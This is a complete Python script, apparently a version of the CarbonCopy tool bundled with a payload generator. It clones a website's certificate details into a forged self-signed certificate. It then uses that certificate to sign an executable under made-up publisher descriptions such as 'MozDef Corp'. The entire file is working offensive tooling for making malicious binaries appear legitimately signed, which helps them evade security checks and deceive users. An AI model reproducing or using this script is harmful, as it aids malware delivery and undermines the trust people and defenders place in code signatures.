#!/usr/bin/python3 
# auto - signs for CarbonCOpy[paranoidninja] in RapidPayload
from OpenSSL import crypto
from sys import argv, platform
from pathlib import Path
import shutil
import ssl
import os
import subprocess

TIMESTAMP_URL = "http://sha256timestamp.ws.symantec.com/sha256/timestamp"
print("\033[1m\033[36m")

def CarbonCopy(host, port, signee, signed):

    try:
        #Fetching Details
        ogcert = ssl.get_server_certificate((host, int(port)))
        x509 = crypto.load_certificate(crypto.FILETYPE_PEM, ogcert)

        certDir = Path('certs')
        certDir.mkdir(exist_ok=True)

        #Creating Fake Certificate
        CNCRT   = certDir / (host + ".crt")
        CNKEY   = certDir / (host + ".key")
        PFXFILE = certDir / (host + ".pfx")

        #Creating Keygen
        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, ((x509.get_pubkey()).bits()))
        cert = crypto.X509()

        #Setting Cert details from loaded from the original Certificate
        cert.set_version(x509.get_version())
        cert.set_serial_number(x509.get_serial_number())
        cert.set_subject(x509.get_subject())
        cert.set_issuer(x509.get_issuer())
        cert.set_notBefore(x509.get_notBefore())
        cert.set_notAfter(x509.get_notAfter())
        cert.set_pubkey(k)
        cert.sign(k, 'sha256')

        CNCRT.write_bytes(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        CNKEY.write_bytes(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))

        try:
            pfx = crypto.PKCS12()
        except AttributeError:
            pfx = crypto.PKCS12Type()
        pfx.set_privatekey(k)
        pfx.set_certificate(cert)
        pfxdata = pfx.export()

        PFXFILE.write_bytes(pfxdata)

        if platform == "win32":
            shutil.copy(signee, signed)
            subprocess.check_call(["signtool.exe", "sign", "/v", "/f", PFXFILE,
                "/d", "MozDef Corp", "/tr", TIMESTAMP_URL,
                "/td", "SHA256", "/fd", "SHA256", signed])

        else:
            args = ("osslsigncode", "sign", "-pkcs12", PFXFILE,
                    "-n", "Notepad Benchmark Util", "-i", TIMESTAMP_URL,
                    "-in", signee, "-out", signed)
            subprocess.check_call(args)

    except Exception as ex:
        print("[X] Something Went Wrong!\n[X] Exception: " + str(ex))

def main():
   
    if len(argv) != 5:
        print("[+] Descr: Impersonates the Certificate of a website\n[!] Usage: " + argv[0] + " <hostname> <port> <build-executable> <signed-executable>\n")
    else:
        CarbonCopy(argv[1], argv[2], argv[3], argv[4])

if __name__ == "__main__":
    main()
